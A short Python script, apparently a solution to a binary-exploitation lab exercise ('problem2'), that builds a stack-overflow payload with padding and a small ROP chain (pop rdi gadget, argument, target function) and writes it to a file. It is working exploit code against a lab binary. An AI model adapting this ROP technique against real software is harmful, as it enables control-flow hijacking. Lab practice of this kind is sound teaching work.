import sys
import struct

# 基础配置
padding = b'A' * 16

# ROP 链组件
pop_rdi_addr = 0x4012c7

arg1 = 0x3f8
func2_addr = 0x401216

# 构造 Payload
rop_chain = struct.pack('<Q', pop_rdi_addr) + \
            struct.pack('<Q', arg1) + \
            struct.pack('<Q', func2_addr)

payload = padding + rop_chain

# 写入文件
print(f"Payload length: {len(payload)}")
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Done! Run: ./problem2 ans2.txt")